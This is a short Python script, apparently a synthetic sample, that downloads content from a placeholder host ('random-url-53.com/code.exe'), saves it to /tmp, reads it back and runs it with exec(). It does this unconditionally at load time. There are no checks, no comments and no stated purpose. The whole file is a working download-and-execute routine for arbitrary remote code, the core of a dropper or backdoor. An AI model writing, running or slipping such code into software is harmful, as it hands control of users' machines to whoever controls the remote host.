import requests
import os

def fetch_code(url):
    res = requests.get(url)
    return res.text

def save_code_to_file(filepath, code):
    with open(filepath, "w") as f:
        f.write(code)

def read_code_from_file(filepath):
    with open(filepath, "r") as f:
        return f.read()

def execute_fetched_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-53.com/code.exe"
    tmp_file = "/tmp/code53.exe"

    downloaded_code = fetch_code(random_url)
    save_code_to_file(tmp_file, downloaded_code)

    code_to_execute = read_code_from_file(tmp_file)
    execute_fetched_code(code_to_execute)

main()
